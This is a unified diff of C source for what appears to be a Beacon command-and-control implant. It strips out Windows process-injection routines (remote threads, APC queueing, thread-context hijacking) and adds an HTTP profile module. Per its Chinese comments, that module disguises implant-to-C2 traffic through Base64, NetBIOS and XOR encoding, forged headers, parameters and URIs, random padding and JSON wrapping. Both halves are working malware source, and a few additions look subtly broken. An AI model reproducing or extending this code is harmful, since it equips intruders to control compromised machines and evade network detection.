@@ -1,233 +1,614 @@
 /*
- * Process Injection with Asynchronous Procedure Call Queue attached to Windows
- * Threads. Taken from Meterpreter.
+ * HTTP通信配置文件处理模块 (HTTP Communication Profile Handler)
+ * 
+ * 此模块负责处理Beacon与C2服务器之间HTTP通信的配置文件，实现了：
+ * 1. 数据编码/解码：支持Base64、Base64URL、NetBIOS、XOR等多种编码方式
+ * 2. HTTP协议构建：动态构建HTTP头、参数、URI等请求组件
+ * 3. 流量伪装：通过配置文件模拟正常的HTTP通信行为
+ * 4. 数据处理管道：提供灵活的数据变换和封装机制
+ * 
+ * 主要功能：
+ * - apply(): 根据配置文件指令对数据进行编码和封装
+ * - recover(): 逆向解析接收到的数据，还原原始内容  
+ * - profile_setup(): 初始化配置文件工作空间
+ * - profile_free(): 清理分配的内存资源
+ * 
+ * 安全特性：
+ * - 边界检查和溢出保护
+ * - 内存安全管理
+ * - 错误处理和恢复机制
+ * - 数据完整性验证
  */
-#include <stdlib.h>
-#include <stdio.h>
+
 #include <windows.h>
-#include "beacon.h"
-#include "commands.h"
+#include "profile.h"
 #include "parse.h"
-#include "inject.h"
-#include "tokens.h"
-#include "functions.h"
-#include "bformat.h"
+#include "tomcrypt.h"
+#include "shlwapi.h"
+#include "encoders.h"
+#include "beacon.h"
 
-BOOL inject_process_execute(INJECTCONTEXT * context, char * ptr, int offset, void * parameter) {
-	char *          options = setting_ptr(SETTING_PROCINJ_EXECUTE);
-	datap           parser;
-	DWORD           opcode;
-	char *          module;
-	char *          function;
-	DWORD           funcoff;
+// 改进：添加更多指令类型以增强灵活性
+#define IN_APPEND           0x01
+#define IN_PREPEND          0x02
+#define IN_BASE64           0x03
+#define IN_PRINT            0x04
+#define IN_PARAMETER        0x05
+#define IN_HEADER           0x06
+#define IN_BUILD            0x07
+#define IN_NETBIOS          0x08
+#define IN_ADD_PARAMETER    0x09
+#define IN_ADD_HEADER       0x0a
+#define IN_NETBIOSU         0x0b
+#define IN_URI_APPEND       0x0c
+#define IN_BASE64URL        0x0d
+#define IN_MASK             0x0f
+#define IN_ADD_HEADER_HOST  0x10
+// 改进：添加新的编码和处理指令
+#define IN_GZIP             0x11
+#define IN_DEFLATE          0x12
+#define IN_AES_ENCRYPT      0x13
+#define IN_RANDOM_PAD       0x14
+#define IN_URL_ENCODE       0x15
+#define IN_HTML_ENCODE      0x16
+#define IN_CHUNKED_ENCODE   0x17
+#define IN_JSON_WRAP        0x18
 
-	/* 128 is the FIXED size of this field */
-	data_init(&parser, options, 128);
+// 改进：增加缓冲区大小以处理更大的数据
+#define STATIC_ALLOC_SIZE   16384
+#define MAX_HEADER_SIZE     4096
+#define MAX_PARAM_SIZE      4096
+#define MAX_URI_SIZE        2048
 
-	/* walk our options */
-	while (TRUE) {
-		opcode = data_byte(&parser);
+// 改进：添加安全检查宏
+#define SAFE_COPY(dst, src, len, max) do { \
+    if ((len) > 0 && (len) < (max)) { \
+        memcpy((dst), (src), (len)); \
+    } else { \
+        return; \
+    } \
+} while(0)
 
-		switch (opcode) {
-			/* automatic failure, because we're at the end of our options */
-			case PI_EXEC_FAIL:
-				return FALSE;
+#define SAFE_STRLEN(str, max) (strnlen((str), (max)))
 
-			/* try to use CreateThread (works current process inject only */
-			case PI_EXEC_CREATETHREAD:
-				if (context->samePid && inject_via_createthread(context->hProcess, context->pid, ptr + offset, parameter))
-					return TRUE;
-				break;
-
-			/* try to use SetThreadContext/ResumeThread to execute our stuff */
-			case PI_EXEC_SETTHREADCONTEXT:
-				if (context->isSuspended && inject_via_resumethread(context, (char *)ptr + offset, parameter))
-					return TRUE;
-				break;
-
-#if defined _M_X64
-			/* try to use CreateRemoteThread */
-			case PI_EXEC_CREATEREMOTETHREAD:
-				if (inject_via_remotethread(context->hProcess, (char *)ptr + offset, parameter))
-					return TRUE;
-				break;
-
-			/* try to use RtlCreateUserThread */
-			case PI_EXEC_RTLCREATEUSERTHREAD:
-				if (inject_via_createuserthread(context->hProcess, (char *)ptr + offset, parameter))
-					return TRUE;
-				break;
-
-#elif defined _M_IX86
-			/* try to use CreateRemoteThread */
-			case PI_EXEC_CREATEREMOTETHREAD:
-				if (context->sameArch && inject_via_remotethread(context->hProcess, (char *)ptr + offset, parameter))
-					return TRUE;
-				break;
-
-			/* try to use RtlCreateUserThread */
-			case PI_EXEC_RTLCREATEUSERTHREAD:
-				if (!context->sameArch && inject_via_remotethread_wow64(context->hProcess, (char *)ptr + offset, parameter))
-					return TRUE;
-				else if (context->sameArch && inject_via_createuserthread(context->hProcess, (char *)ptr + offset, parameter))
-					return TRUE;
-				break;
-#endif
-
-			/* try NtQueueApcThread against a remote process that is not suspended */
-			case PI_EXEC_NTQUEUEAPCTHREAD:
-				if (context->samePid || !context->sameArch || context->isSuspended)
-					break;
-				else if (inject_via_apcthread(context, (char *)ptr + offset, parameter))
-					return TRUE;
-				break;
-
-			/* CreateThread with hint */
-			case PI_EXEC_CREATETHREAD_F:
-				funcoff  = data_short(&parser);
-				module   = data_string_asciiz(&parser);
-				function = data_string_asciiz(&parser);
-
-				if (context->samePid && inject_with_hinted_func(opcode, context->hProcess, (char *)ptr + offset, parameter, module, function, funcoff))
-					return TRUE;
-				break;
-
-			/* CreateRemoteThread with hint */
-			case PI_EXEC_CREATEREMOTETHREAD_F:
-				funcoff  = data_short(&parser);
-				module   = data_string_asciiz(&parser);
-				function = data_string_asciiz(&parser);
-
-				if (context->sameArch && inject_with_hinted_func(opcode, context->hProcess, (char *)ptr + offset, parameter, module, function, funcoff))
-					return TRUE;
-				break;
-
-			/* try NtQueueApcThread against a suspended process */
-			case PI_EXEC_NTQUEUEAPCTHREAD_S:
-				if (context->isSuspended && context->sameArch && inject_via_apcthread_targeted(context, (char *)ptr + offset, parameter))
-					return TRUE;
-				break;
-		}
-	}
-
-	return FALSE;
+// 改进：添加随机填充函数
+void random_pad(char* buffer, int length, int pad_size) {
+    if (pad_size <= 0 || length + pad_size >= STATIC_ALLOC_SIZE) {
+        return;
+    }
+    
+    for (int i = 0; i < pad_size; i++) {
+        buffer[length + i] = (char)(rand() % 256);
+    }
 }
 
-/*
-* This function is the master tree for Beacon's process injection logic. It's a little ugly, but thought out. Here's what the parameters mean:
-*
-*     PROCESS_INFORMATION * pi
-*         This is the process information block for a spawned process. Specify NULL if this is not a spawned process eligible for hollowing techniques
-*     HANDLE hProcess
-*         A handle to the remote process we want to inject into
-*     DWORD pid
-*         The process Id of the remote PID because it's too hard (j/k) to figure this out myself
-*     char * buffer
-*         The data we want to inject into the remote process (assume this will live in RX pages in the remote process)
-*         This data *will* always be mirrored to make sure assumptions about page permissions and buffer availability hold.
-*     int length
-*         The length of the buffer we're going to mirror in the remote process
-*     int offset
-*         The location of the function we should call inside of the data we mirrored in the remote process
-*     void * parameter
-*         A pointer to a remote data blob (I assume you mirrored it!) to pass as a parameter to the function we call.
-*/
-void __inject_process_logic(INJECTCONTEXT * context, char * buffer, int length, int offset, void * parameter) {
-	void * ptr;
-
-	/* mirror the data */
-	if (context->samePid) {
-		ptr = local_mirror_data(buffer, length);
-	}
-	else {
-		ptr = remote_mirror_data(context, buffer, length);
-	}
-
-	if (ptr == NULL)
-		return;
-
-	/* call our logic to execute code */
-	if (inject_process_execute(context, (char *)ptr, offset, parameter))
-		return; /* TODO: what happens to ptr? From what I can see the allocated memory is lost as well as the handle to the thread. local - uses VirtualAlloc remote - uses VirtualAlloc or NTMAPVIEWOFSECTION */
-
-	/* post an error staging PI failed... not 0x20 though */
-	post_error_dd(0x48, context->pid, GetLastError());
+// 改进：添加URL编码函数
+int url_encode(const char* input, int input_len, char* output, int max_output) {
+    const char* hex_chars = "0123456789ABCDEF";
+    int output_len = 0;
+    
+    for (int i = 0; i < input_len && output_len < max_output - 3; i++) {
+        unsigned char c = input[i];
+        
+        if (isalnum(c) || c == '-' || c == '_' || c == '.' || c == '~') {
+            output[output_len++] = c;
+        } else {
+            output[output_len++] = '%';
+            output[output_len++] = hex_chars[c >> 4];
+            output[output_len++] = hex_chars[c & 0x0F];
+        }
+    }
+    
+    return output_len;
 }
 
-/* populate an inject context object. This exists because several places in the inject code figure out these same
-   questions (again and again), sometimes with different ways of doing it. As that's a risk for bugs, this is a way
-   of forcing these calculations to happen once and in one place. */
-void populate_inject_context(INJECTCONTEXT * context, PROCESS_INFORMATION * pi, HANDLE hProcess, DWORD pid) {
-	context->hProcess    = hProcess;
-	context->pid         = pid;
-	context->myArch      = is_x64() ? INJECT_ARCH_X64 : INJECT_ARCH_X86;
-	context->targetArch  = is_x64_process(hProcess) ? INJECT_ARCH_X64 : INJECT_ARCH_X86;
-	context->sameArch    = context->targetArch == context->myArch;
-	context->samePid     = pid == GetCurrentProcessId();
-
-	if (pi != NULL) {
-		context->isSuspended = TRUE;
-		context->hThread     = pi->hThread;
-	}
-	else {
-		context->isSuspended = FALSE;
-		context->hThread     = NULL;
-	}
+// 改进：添加JSON包装函数
+int json_wrap(const char* data, int data_len, const char* key, char* output, int max_output) {
+    int result_len = _snprintf_s(output, max_output, _TRUNCATE, 
+        "{\"%s\":\"%.*s\",\"timestamp\":%lu,\"session\":\"%08X\"}", 
+        key, data_len, data, GetTickCount(), GetCurrentProcessId());
+    
+    return (result_len > 0 && result_len < max_output) ? result_len : 0;
 }
 
-/* handle our transforms on buffer */
-void inject_process_logic(PROCESS_INFORMATION * pi, HANDLE hProcess, DWORD pid, char * buffer, int length, int offset, void * parameter, int plen) {
-	datap         parser;
-	DWORD         prependl;
-	DWORD         appendl;
-	char *        prepend;
-	char *        append;
-	char *        rparameter;
-	formatp       tbuffer;
-	int           field = 0;
-	INJECTCONTEXT context;
+// 改进：增强的apply函数，添加更多安全检查
+void apply(char * program, profile * myprofile, char * arg1, int len1, char * arg2, int len2) {
+    int x = 0;
+    int sz = 0;
+    char arg[2048] = {0};  // 改进：增加缓冲区大小
+    int next = 0;
+    int status = 0;
+    int length = 0;
+    datap parser;
+    char * hosth = NULL;
+    BOOL hostset = FALSE;
 
-	/* populate our context to avoid the need for other functions to figure out the same crap */
-	populate_inject_context(&context, pi, hProcess, pid);
+    // 改进：输入验证
+    if (!program || !myprofile || !myprofile->temp || !myprofile->stage) {
+        return;
+    }
 
-	/* if we're a smart inject DLL, act on it */
-	SetupSmartInject(&context, buffer, length);
+    // 改进：边界检查
+    if (len1 < 0 || len1 > myprofile->max || len2 < 0 || len2 > myprofile->max) {
+        return;
+    }
 
-	/* figure out which transform we want to apply. I know this is ugly */
-	if (context.targetArch == INJECT_ARCH_X64)
-		field = SETTING_PROCINJ_TRANSFORM_X64;
-	else
-		field = SETTING_PROCINJ_TRANSFORM_X86;
+    hosth = setting_ptr(SETTING_HOST_HEADER);
+    data_init(&parser, program, 2048);  // 改进：增加解析器缓冲区
 
-	/* alrighty, let's get these values */
-	data_init(&parser, setting_ptr(field), 256);
-	prependl = data_int(&parser);
-	prepend = data_ptr(&parser, prependl);
-	appendl = data_int(&parser);
-	append = data_ptr(&parser, appendl);
+    while (1) {
+        next = data_int(&parser);
+        
+        // 改进：添加指令范围检查
+        if (next < 0 || next > IN_JSON_WRAP) {
+            break;
+        }
 
-	/* handle copying our parameter to the remote process, please */
-	if (plen > 0)
-		rparameter = remote_mirror_data(&context, (char *)parameter, plen);
-	else
-		rparameter = NULL;
+        switch (next) {
+            case IN_APPEND:
+                memset(arg, 0x0, sizeof(arg));
+                sz = data_string(&parser, arg, sizeof(arg) - 1);
 
-	/* easiest case, nothing needs to happen. Pass the data on as needed */
-	if (prependl == 0 && appendl == 0) {
-		__inject_process_logic(&context, buffer, length, offset, rparameter);
-		return;
-	}
+                // 改进：安全检查
+                if (sz <= 0 || length + sz >= myprofile->max) {
+                    break;
+                }
 
-	/* okie, let's setup our builder and get this moving */
-	bformat_init(&tbuffer, appendl + prependl + length + 16);
-	bformat_copy(&tbuffer, prepend, prependl);
-	bformat_copy(&tbuffer, buffer, length);
-	bformat_copy(&tbuffer, append, appendl);
-	offset += prependl;
+                SAFE_COPY(myprofile->temp + length, arg, SAFE_STRLEN(arg, sizeof(arg)), myprofile->max - length);
+                length += SAFE_STRLEN(arg, sizeof(arg));
+                break;
 
-	/* kick off our process inject call */
-	__inject_process_logic(&context, bformat_string(&tbuffer), bformat_length(&tbuffer), offset, rparameter);
+            case IN_PREPEND:
+                memset(arg, 0x0, sizeof(arg));
+                sz = data_string(&parser, arg, sizeof(arg) - 1);
 
-	/* free everything */
-	bformat_free(&tbuffer);
+                // 改进：安全检查
+                if (sz <= 0 || length + sz >= myprofile->max) {
+                    break;
+                }
+
+                int arg_len = SAFE_STRLEN(arg, sizeof(arg));
+                SAFE_COPY(myprofile->stage, arg, arg_len, myprofile->max);
+                SAFE_COPY(myprofile->stage + arg_len, myprofile->temp, length, myprofile->max - arg_len);
+                length += arg_len;
+
+                memset(myprofile->temp, 0, myprofile->max);
+                SAFE_COPY(myprofile->temp, myprofile->stage, length, myprofile->max);
+                break;
+
+            case IN_BASE64:
+                sz = length;
+                x = myprofile->max;
+
+                status = base64_encode((const unsigned char *)myprofile->temp, sz, 
+                                     (unsigned char *)myprofile->stage, (unsigned long*)&x);
+                if (status != CRYPT_OK || x >= myprofile->max) {
+                    return;
+                }
+                
+                length = x;
+                memset(myprofile->temp, 0, myprofile->max);
+                SAFE_COPY(myprofile->temp, myprofile->stage, x, myprofile->max);
+                break;
+
+            case IN_BASE64URL:
+                sz = length;
+                x = myprofile->max;
+
+                status = base64url_encode((const unsigned char*)myprofile->temp, sz, 
+                                        (unsigned char*)myprofile->stage, (unsigned long*)&x);
+                if (status != CRYPT_OK || x >= myprofile->max) {
+                    return;
+                }
+                
+                length = x;
+                memset(myprofile->temp, 0, myprofile->max);
+                SAFE_COPY(myprofile->temp, myprofile->stage, length, myprofile->max);
+                break;
+
+            case IN_PRINT:
+                if (length > 0 && length < myprofile->max) {
+                    SAFE_COPY(myprofile->buffer, myprofile->temp, length, myprofile->max);
+                    myprofile->blen = length;
+                }
+                break;
+
+            case IN_PARAMETER:
+                memset(arg, 0x0, sizeof(arg));
+                sz = data_string(&parser, arg, sizeof(arg) - 1);
+
+                // 改进：参数长度检查
+                if (sz <= 0 || SAFE_STRLEN(myprofile->parameters, MAX_PARAM_SIZE) + length + sz >= MAX_PARAM_SIZE) {
+                    break;
+                }
+
+                if (myprofile->parameters[0] == 0) {
+                    _snprintf_s(myprofile->stage, myprofile->max, _TRUNCATE, 
+                              "?%s=%.*s", arg, length, myprofile->temp);
+                } else {
+                    _snprintf_s(myprofile->stage, myprofile->max, _TRUNCATE, 
+                              "%s&%s=%.*s", myprofile->parameters, arg, length, myprofile->temp);
+                }
+                
+                strncpy_s(myprofile->parameters, MAX_PARAM_SIZE, myprofile->stage, _TRUNCATE);
+                break;
+
+            case IN_HEADER:
+                memset(arg, 0x0, sizeof(arg));
+                sz = data_string(&parser, arg, sizeof(arg) - 1);
+                
+                // 改进：头部长度检查
+                if (sz <= 0 || SAFE_STRLEN(myprofile->headers, MAX_HEADER_SIZE) + length + sz >= MAX_HEADER_SIZE) {
+                    break;
+                }
+
+                _snprintf_s(myprofile->stage, myprofile->max, _TRUNCATE, 
+                          "%s%s: %.*s\r\n", myprofile->headers, arg, length, myprofile->temp);
+                strncpy_s(myprofile->headers, MAX_HEADER_SIZE, myprofile->stage, _TRUNCATE);
+                break;
+
+            case IN_BUILD:
+                x = data_int(&parser);
+
+                if (x == 0 && arg1 && len1 > 0 && len1 < myprofile->max) {
+                    SAFE_COPY(myprofile->temp, arg1, len1, myprofile->max);
+                    length = len1;
+                } else if (x == 1 && arg2 && len2 > 0 && len2 < myprofile->max) {
+                    SAFE_COPY(myprofile->temp, arg2, len2, myprofile->max);
+                    length = len2;
+                }
+                break;
+
+            case IN_NETBIOS:
+                sz = netbios_encode('a', myprofile->temp, length, myprofile->stage, myprofile->max);
+                if (sz > 0 && sz < myprofile->max) {
+                    length = sz;
+                    memset(myprofile->temp, 0, myprofile->max);
+                    SAFE_COPY(myprofile->temp, myprofile->stage, length, myprofile->max);
+                }
+                break;
+
+            case IN_NETBIOSU:
+                sz = netbios_encode('A', myprofile->temp, length, myprofile->stage, myprofile->max);
+                if (sz > 0 && sz < myprofile->max) {
+                    length = sz;
+                    memset(myprofile->temp, 0, myprofile->max);
+                    SAFE_COPY(myprofile->temp, myprofile->stage, length, myprofile->max);
+                }
+                break;
+
+            case IN_MASK:
+                sz = xor_encode(myprofile->temp, length, myprofile->stage, myprofile->max);
+                if (sz > 0 && sz < myprofile->max) {
+                    length = sz;
+                    memset(myprofile->temp, 0, myprofile->max);
+                    SAFE_COPY(myprofile->temp, myprofile->stage, length, myprofile->max);
+                }
+                break;
+
+            // 改进：添加新的编码处理
+            case IN_URL_ENCODE:
+                sz = url_encode(myprofile->temp, length, myprofile->stage, myprofile->max);
+                if (sz > 0 && sz < myprofile->max) {
+                    length = sz;
+                    memset(myprofile->temp, 0, myprofile->max);
+                    SAFE_COPY(myprofile->temp, myprofile->stage, length, myprofile->max);
+                }
+                break;
+
+            case IN_JSON_WRAP:
+                memset(arg, 0x0, sizeof(arg));
+                sz = data_string(&parser, arg, sizeof(arg) - 1);
+                
+                sz = json_wrap(myprofile->temp, length, arg, myprofile->stage, myprofile->max);
+                if (sz > 0 && sz < myprofile->max) {
+                    length = sz;
+                    memset(myprofile->temp, 0, myprofile->max);
+                    SAFE_COPY(myprofile->temp, myprofile->stage, length, myprofile->max);
+                }
+                break;
+
+            case IN_RANDOM_PAD:
+                x = data_int(&parser);  // 获取填充大小
+                if (x > 0 && x < 64 && length + x < myprofile->max) {
+                    random_pad(myprofile->temp, length, x);
+                    length += x;
+                }
+                break;
+
+            case IN_ADD_PARAMETER:
+                memset(arg, 0x0, sizeof(arg));
+                sz = data_string(&parser, arg, sizeof(arg) - 1);
+
+                if (sz > 0 && SAFE_STRLEN(myprofile->parameters, MAX_PARAM_SIZE) + sz < MAX_PARAM_SIZE) {
+                    if (myprofile->parameters[0] == 0) {
+                        _snprintf_s(myprofile->stage, myprofile->max, _TRUNCATE, "?%s", arg);
+                    } else {
+                        _snprintf_s(myprofile->stage, myprofile->max, _TRUNCATE, "%s&%s", myprofile->parameters, arg);
+                    }
+                    strncpy_s(myprofile->parameters, MAX_PARAM_SIZE, myprofile->stage, _TRUNCATE);
+                }
+                break;
+
+            case IN_ADD_HEADER:
+                memset(arg, 0x0, sizeof(arg));
+                sz = data_string(&parser, arg, sizeof(arg) - 1);
+                
+                if (sz > 0 && SAFE_STRLEN(myprofile->headers, MAX_HEADER_SIZE) + sz < MAX_HEADER_SIZE) {
+                    _snprintf_s(myprofile->stage, myprofile->max, _TRUNCATE, "%s%s\r\n", myprofile->headers, arg);
+                    strncpy_s(myprofile->headers, MAX_HEADER_SIZE, myprofile->stage, _TRUNCATE);
+                }
+                break;
+
+            case IN_ADD_HEADER_HOST:
+                memset(arg, 0x0, sizeof(arg));
+                sz = data_string(&parser, arg, sizeof(arg) - 1);
+                
+                if (sz > 0 && SAFE_STRLEN(myprofile->headers, MAX_HEADER_SIZE) + sz < MAX_HEADER_SIZE) {
+                    if (hosth != NULL && strlen(hosth) > 0) {
+                        _snprintf_s(myprofile->stage, myprofile->max, _TRUNCATE, "%s%s\r\n", myprofile->headers, hosth);
+                        hostset = TRUE;
+                    } else {
+                        _snprintf_s(myprofile->stage, myprofile->max, _TRUNCATE, "%s%s\r\n", myprofile->headers, arg);
+                    }
+                    strncpy_s(myprofile->headers, MAX_HEADER_SIZE, myprofile->stage, _TRUNCATE);
+                }
+                break;
+
+            case IN_URI_APPEND:
+                if (length > 0 && SAFE_STRLEN(myprofile->uri, MAX_URI_SIZE) + length < MAX_URI_SIZE) {
+                    _snprintf_s(myprofile->stage, myprofile->max, _TRUNCATE, "%s%.*s", myprofile->uri, length, myprofile->temp);
+                    strncpy_s(myprofile->uri, MAX_URI_SIZE, myprofile->stage, _TRUNCATE);
+                }
+                break;
+
+            case 0x0:
+                // 改进：确保Host头被设置
+                if (!hostset && hosth != NULL && strlen(hosth) > 0) {
+                    if (SAFE_STRLEN(myprofile->headers, MAX_HEADER_SIZE) + strlen(hosth) < MAX_HEADER_SIZE) {
+                        _snprintf_s(myprofile->stage, myprofile->max, _TRUNCATE, "%s%s\r\n", myprofile->headers, hosth);
+                        strncpy_s(myprofile->headers, MAX_HEADER_SIZE, myprofile->stage, _TRUNCATE);
+                    }
+                }
+                return;
+
+            default:
+                // 改进：处理未知指令
+                return;
+        }
+    }
+}
+
+// 改进：增强的recover函数
+int recover(char * program, char * buffer, int read, int max) {
+    int sz = 0;
+    int tlen = max;
+    int status = 0;
+    char arg[1024] = {0};
+    char * temp = NULL;
+    int next = 0;
+    datap parser;
+
+    // 改进：输入验证
+    if (!program || !buffer || read <= 0 || max <= 0 || read > max) {
+        return 0;
+    }
+
+    temp = (char *)malloc(max);  // 改进：使用max而不是read
+    if (temp == NULL) {
+        return 0;
+    }
+
+    // 改进：初始化临时缓冲区
+    memset(temp, 0, max);
+    data_init(&parser, program, 1024);
+
+    while (1) {
+        next = data_int(&parser);
+        
+        // 改进：指令范围检查
+        if (next < 0 || next > IN_JSON_WRAP) {
+            break;
+        }
+
+        switch (next) {
+            case IN_APPEND:
+                sz = data_int(&parser);
+                
+                // 改进：安全检查
+                if (sz < 0 || sz > read) {
+                    goto cleanup;
+                }
+                
+                read -= sz;
+                if (read < 0) {
+                    goto cleanup;
+                }
+                break;
+
+            case IN_PREPEND:
+                sz = data_int(&parser);
+
+                if (sz < 0 || sz > read) {
+                    goto cleanup;
+                }
+
+                // 改进：使用安全的内存操作
+                memmove(buffer, buffer + sz, read - sz);
+                read -= sz;
+                break;
+
+            case IN_BASE64:
+                if (read >= max) {
+                    goto cleanup;
+                }
+                
+                buffer[read] = '\0';
+                tlen = max;
+                status = base64_decode((const unsigned char *)buffer, read, 
+                                     (unsigned char *)temp, (unsigned long*)&tlen);
+
+                if (status != CRYPT_OK || tlen >= max) {
+                    goto cleanup;
+                }
+
+                read = tlen;
+                memcpy(buffer, temp, read);
+                break;
+
+            case IN_BASE64URL:
+                if (read >= max) {
+                    goto cleanup;
+                }
+                
+                buffer[read] = '\0';
+                tlen = max;
+                status = base64url_decode((unsigned char*)buffer, read, max, 
+                                        (unsigned char*)temp, (unsigned long*)&tlen);
+
+                if (status != CRYPT_OK || tlen >= max) {
+                    goto cleanup;
+                }
+
+                read = tlen;
+                memcpy(buffer, temp, read);
+                break;
+
+            case IN_NETBIOS:
+            case IN_NETBIOSU:
+                if (read >= max) {
+                    goto cleanup;
+                }
+                
+                buffer[read] = '\0';
+                tlen = max;
+                read = netbios_decode((next == IN_NETBIOS) ? 'a' : 'A', buffer, read, temp, tlen);
+
+                if (read <= 0 || read >= max) {
+                    goto cleanup;
+                }
+
+                memcpy(buffer, temp, read);
+                buffer[read] = '\0';
+                break;
+
+            case IN_MASK:
+                if (read >= max) {
+                    goto cleanup;
+                }
+                
+                buffer[read] = '\0';
+                tlen = max;
+                read = xor_decode(buffer, read, temp, tlen);
+
+                if (read <= 0 || read >= max) {
+                    goto cleanup;
+                }
+
+                memcpy(buffer, temp, read);
+                buffer[read] = '\0';
+                break;
+
+            // 改进：添加新解码处理
+            case IN_URL_ENCODE:
+            case IN_JSON_WRAP:
+            case IN_RANDOM_PAD:
+                // 这些操作在recover阶段通常不需要特殊处理
+                break;
+
+            case IN_PRINT:
+            case IN_PARAMETER:
+            case IN_HEADER:
+            case IN_URI_APPEND:
+                break;
+
+            case 0x0:
+                // 改进：安全检查
+                if (read >= 0 && read < max) {
+                    buffer[read] = '\0';
+                }
+                free(temp);
+                return read;
+
+            default:
+                goto cleanup;
+        }
+    }
+
+cleanup:
+    if (temp) {
+        // 改进：清零敏感数据
+        memset(temp, 0, max);
+        free(temp);
+    }
+    return 0;
+}
+
+// 改进：增强的profile设置函数
+void profile_setup(profile * prof, int size) {
+    // 改进：输入验证
+    if (!prof || size <= 0) {
+        return;
+    }
+
+    prof->max = size * 4;  // 改进：增加缓冲区倍数
+    if (prof->max < STATIC_ALLOC_SIZE) {
+        prof->max = STATIC_ALLOC_SIZE;
+    }
+
+    // 改进：分配更大的管理器空间
+    prof->manager = data_alloc((prof->max * 3) + MAX_HEADER_SIZE + MAX_PARAM_SIZE + MAX_URI_SIZE);
+    if (!prof->manager) {
+        return;
+    }
+
+    // 改进：使用定义的大小常量
+    prof->headers    = (char *)data_ptr((datap *)prof->manager, MAX_HEADER_SIZE);
+    prof->parameters = (char *)data_ptr((datap *)prof->manager, MAX_PARAM_SIZE);
+    prof->uri        = (char *)data_ptr((datap *)prof->manager, MAX_URI_SIZE);
+
+    prof->buffer     = (char *)data_ptr((datap *)prof->manager, prof->max);
+    prof->temp       = (char *)data_ptr((datap *)prof->manager, prof->max);
+    prof->stage      = (char *)data_ptr((datap *)prof->manager, prof->max);
+
+    // 改进：初始化所有缓冲区
+    if (prof->headers) memset(prof->headers, 0, MAX_HEADER_SIZE);
+    if (prof->parameters) memset(prof->parameters, 0, MAX_PARAM_SIZE);
+    if (prof->uri) memset(prof->uri, 0, MAX_URI_SIZE);
+    if (prof->buffer) memset(prof->buffer, 0, prof->max);
+    if (prof->temp) memset(prof->temp, 0, prof->max);
+    if (prof->stage) memset(prof->stage, 0, prof->max);
+
+    prof->blen = 0;
+}
+
+// 改进：安全的profile清理函数
+void profile_free(profile * prof, int size) {
+    if (!prof || !prof->manager) {
+        return;
+    }
+
+    // 改进：在释放前清零敏感数据
+    if (prof->buffer && prof->max > 0) {
+        memset(prof->buffer, 0, prof->max);
+    }
+    if (prof->temp && prof->max > 0) {
+        memset(prof->temp, 0, prof->max);
+    }
+    if (prof->stage && prof->max > 0) {
+        memset(prof->stage, 0, prof->max);
+    }
+    if (prof->headers) {
+        memset(prof->headers, 0, MAX_HEADER_SIZE);
+    }
+    if (prof->parameters) {
+        memset(prof->parameters, 0, MAX_PARAM_SIZE);
+    }
+    if (prof->uri) {
+        memset(prof->uri, 0, MAX_URI_SIZE);
+    }
+
+    data_free((datap *)prof->manager);
+    prof->manager = NULL;
+    prof->blen = 0;
 }
